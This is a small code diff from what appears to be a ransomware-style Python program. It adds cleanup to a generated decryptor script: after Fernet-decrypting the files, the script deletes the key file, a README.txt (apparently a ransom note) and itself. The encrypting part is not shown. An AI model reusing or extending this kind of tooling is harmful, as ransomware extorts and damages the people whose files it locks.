@@ -47,6 +47,9 @@ for file in files:
     decodedData = Fernet(key).decrypt(data)
     with open(file, "wb") as fileData:
         fileData.write(decodedData)
+os.remove("./key.key")
+os.remove("./README.txt")
+os.remove("./decrypt.py")
 print("YOUR FILES ARE READY FOR YOU SIR")
 '''
     )
